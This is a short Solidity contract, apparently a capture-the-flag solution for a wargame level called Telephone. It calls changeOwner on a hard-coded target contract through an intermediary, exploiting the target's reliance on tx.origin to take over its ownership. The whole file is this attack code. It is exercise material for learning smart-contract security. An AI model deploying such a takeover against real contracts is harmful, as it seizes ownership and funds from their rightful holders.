// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public telephoneContract;

    constructor() public {
        telephoneContract = Telephone(
            0x6496169360a8B23901F97464B1c3a79DC8c6D088
        );
    }

    function attack() public {
        telephoneContract.changeOwner(
            0x0bae3B8E702eA3e9F85594ca69Baa9aA3f2F901B
        );
    }
}
